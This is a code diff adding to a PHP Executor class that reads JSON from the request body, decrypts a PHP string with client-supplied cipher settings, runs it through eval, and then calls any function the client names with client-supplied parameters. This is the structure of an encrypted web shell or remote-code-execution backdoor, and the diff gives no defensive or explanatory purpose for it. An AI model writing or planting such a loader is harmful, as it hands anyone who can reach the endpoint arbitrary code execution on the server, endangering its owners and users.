@@ -365,24 +365,44 @@ class GetPHP
 class Executor
 {
     use Singleton;
+    use ClientDataValidator;
     private readonly Decryptor $decryptor;
-    private array $clientData = [];
+    private array $decryptorData;
+    private ?string $command;
+    private ?array $parameters;
+    private function getClassObjs(): array
+    {
+        return [
+            "decryptor" => new ClassObjTyping(Typing::OBJECT, ClassObjOptional::MANDATORY),
+            "command" => new ClassObjTyping(Typing::STRING, ClassObjOptional::OPTIONAL),
+            "parameters" => new ClassObjTyping(Typing::OBJECT, ClassObjOptional::OPTIONAL),
+        ];
+    }
     private function __construct()
     {
         $rawClientData = file_get_contents('php://input');
-        $this->clientData = json_decode(
+        $clientData = json_decode(
             json: $rawClientData,
             associative: true,
             flags: JSON_THROW_ON_ERROR
         );
-        // $this->clientData = [
-        //     "cipher_algo" => "aes-256-gcm",
-        //     "passphrase" => "lol",
-        // ];
+        $this->validate($clientData);
+        $this->decryptorData = $clientData["decryptor"];
+        if (isset($clientData["command"]))
+            $this->command = $clientData["command"];
+        if (isset($clientData["parameters"]))
+            $this->parameters = $clientData["parameters"];
         $decryptorPtr = GetPHP::getInstance()->getDecryptor();
-        $this->decryptor = $decryptorPtr::getInstance($this->clientData);
+        $this->decryptor = $decryptorPtr::getInstance($this->decryptorData);
     }
-    private function exec(string $encryptedPhpString)
+    private function exec(string $encryptedPhpString): mixed
     {
+        $phpString = $this->decryptor->decrypt($encryptedPhpString);
+        $evalReturn = eval($phpString);
+        if (!$this->command)
+            return $evalReturn;
+        if (!function_exists($this->command))
+            throw new Exception("function main does not exist");
+        return call_user_func($this->command, $this->parameters);
     }
 }
